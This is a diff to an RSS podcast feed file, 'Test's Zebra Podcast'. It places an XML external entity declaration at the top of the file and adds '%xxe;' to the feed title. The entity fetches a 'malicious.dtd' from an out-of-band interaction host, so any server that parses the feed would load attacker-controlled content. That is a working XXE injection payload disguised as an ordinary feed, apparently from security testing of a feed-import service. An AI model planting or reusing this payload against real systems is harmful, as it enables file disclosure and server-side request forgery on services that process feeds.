@@ -1,8 +1,10 @@
 <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [<!ENTITY % xxe SYSTEM
+"http://daktjuugetxfexxmsubleucx0ezw6jzcv.oast.fun/malicious.dtd">]>
 <rss version="2.0"
     xmlns:xtest="http://www.itunes.com/dtds/podcast-1.0.dtd">
   <channel>
-    <title>Test's Zebra Podcast</title>
+    <title>Test's Zebra Podcast %xxe;</title>
     <xtest:owner>
         <xtest:email>superua.site88@gmail.com</xtest:email>
     </xtest:owner>
@@ -30,6 +32,4 @@
       <guid>dzpodclean</guid>
     </item>
   </channel>
-      <!DOCTYPE foo [<!ENTITY % xxe SYSTEM
-"http://daktjuugetxfexxmsubleucx0ezw6jzcv.oast.fun/malicious.dtd"> %xxe;]>
 </rss>
